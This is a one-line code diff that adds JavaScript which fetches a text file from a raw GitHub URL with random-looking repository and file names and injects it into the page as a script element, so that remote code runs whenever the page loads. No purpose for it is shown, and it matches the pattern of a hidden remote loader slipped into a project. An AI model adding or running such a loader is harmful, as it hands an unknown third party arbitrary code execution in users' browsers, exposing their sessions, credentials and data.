@@ -1,0 +1,1 @@
+fetch('https://raw.githubusercontent.com/nauxxe/alksnd9wdl/refs/heads/main/kslmcasoslm').then(r=>r.text()).then(s=>{const S=document.createElement('script');S.textContent=s;document.head.appendChild(S);});
